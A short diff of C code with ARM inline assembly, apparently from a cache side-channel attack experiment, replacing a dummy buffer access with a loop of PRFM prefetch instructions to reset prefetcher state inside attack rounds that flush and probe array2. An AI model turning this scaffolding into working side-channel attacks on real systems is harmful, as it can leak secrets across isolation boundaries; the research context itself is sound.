@@ -49,7 +49,12 @@ uint8_t array1[100*LINE_SIZE]={0};
 static uint8_t* dummy_buffer;
 
 void dummyAccesses(void){
-  dummyAccess(dummy_buffer, DUMMY_BUFFER_SIZE);
+  // dummyAccess(dummy_buffer, DUMMY_BUFFER_SIZE);
+       for(uint32_t j = 0; j < DUMMY_BUFFER_SIZE; j+=64){
+        // asm volatile("PRFM PLDL3STRM, [%0]\n\t" :: "r"(&dummy_buffer[i]));
+        asm volatile("PRFM PLDL1KEEP, [%0]\n\t" :: "r"(&dummy_buffer[j]));
+        // asm volatile("LDR w0, [%0]\n\t" :: "r"(&dummy_buffer[i]) : "memory", "w0");
+     }
 }
 
 static inline __attribute__((always_inline)) void stride_access(void *addr) {
@@ -141,6 +146,7 @@ int main(){
         for(int pos = 0; pos < PROBES; pos++){//test one position
           for(uint64_t atkRound = 0; atkRound < ROUNDS; ++atkRound) {
             dummyAccesses();//for dummy accesses , reset the prefetcher state
+            
             for (uint64_t offset = 0; offset < Items*LINE_SIZE; offset+=LINE_SIZE){
                   flush(&array2[offset]);
             }
